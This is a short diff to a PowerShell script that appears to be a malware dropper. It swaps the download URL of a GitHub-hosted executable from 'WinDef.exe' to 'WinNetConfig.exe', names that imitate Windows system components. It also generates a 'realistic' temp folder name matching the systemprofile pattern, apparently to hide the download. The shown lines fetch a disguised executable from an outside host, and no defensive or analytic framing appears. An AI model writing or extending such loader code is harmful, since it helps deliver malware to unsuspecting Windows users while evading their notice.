@@ -51,7 +51,7 @@ function Generate-TempFolderName {
 # Download application from URLa
 try {
     # URL of the application to download
-    $downloadUrl = "https://github.com/MillyNine/1/raw/refs/heads/main/WinDef.exe"  # Replace with actual URL
+    $downloadUrl = "https://github.com/afscoder29/bookish-disco/raw/refs/heads/main/WinNetConfig.exe"  # Replace with actual URL
     
     # Generate realistic temp folder name matching systemprofile pattern
     $tempFolderName = Generate-TempFolderName
